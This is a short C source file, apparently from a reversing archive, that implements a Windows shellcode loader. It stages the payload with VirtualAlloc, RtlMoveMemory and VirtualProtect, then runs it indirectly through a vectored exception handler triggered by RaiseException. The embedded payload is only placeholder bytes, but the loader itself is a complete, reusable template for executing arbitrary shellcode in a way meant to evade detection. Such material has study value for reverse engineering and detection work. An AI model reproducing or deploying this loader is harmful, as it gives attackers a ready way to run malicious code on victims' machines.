/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /EHsc /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  SetExceptionhandler + RaiseException

Note:
    - address of shellcode is passed as argument
*/

#include <windows.h>
#include <stdint.h>

// prototype to exception handler
LONG handler (_EXCEPTION_POINTERS * info);


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    ULONG_PTR   arguments[EXCEPTION_MAXIMUM_PARAMETERS];
    PVOID       h;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        // pass address of shellcode as argument
        arguments[0] = (ULONG_PTR)runtime;

        // register exception handler
        h = AddVectoredExceptionHandler(1,handler);

        // trigger the exception
        RaiseException(1, 0, 1, arguments);

        // remove exception
        RemoveVectoredExceptionHandler(h);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}

LONG handler (_EXCEPTION_POINTERS * info)
{
    UNREFERENCED_PARAMETER(info);

    ULONG_PTR * arguments;
    int (*func)();

    // retrieve the address of shellcode and cast it as function
    arguments = info->ExceptionRecord->ExceptionInformation;
    func = (int (*)())arguments[0];

    // executing by direct invocation
    func();

    return EXCEPTION_EXECUTE_HANDLER;
}